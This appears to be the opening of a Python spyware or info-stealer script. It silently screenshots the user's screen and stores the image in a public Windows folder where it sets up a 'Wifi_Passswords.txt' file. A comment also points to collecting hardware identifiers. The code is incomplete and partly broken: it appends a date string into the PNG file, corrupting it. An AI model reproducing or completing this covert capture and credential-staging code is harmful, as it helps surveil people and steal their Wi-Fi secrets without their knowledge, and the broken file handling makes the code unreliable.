import platform
import subprocess
#WMIC CSPRODUCT
import os
import socket
import pyscreenshot as screenCapture
import PIL

date = subprocess.check_output(["date"]).decode('utf-8')
save_path = "C:\\Users\\Public\\Roaming\\"
file_path = "C:\\Users\\Public\\Roaming\\"

wifiInfo = os.path.join(save_path, "Wifi_Passswords.txt")
screenshot = os.path.join(save_path, "screenshot.png")

img = screenCapture.grab()
img.save(screenshot)
f = open(screenshot, "a")
f.write(date)
f.close()
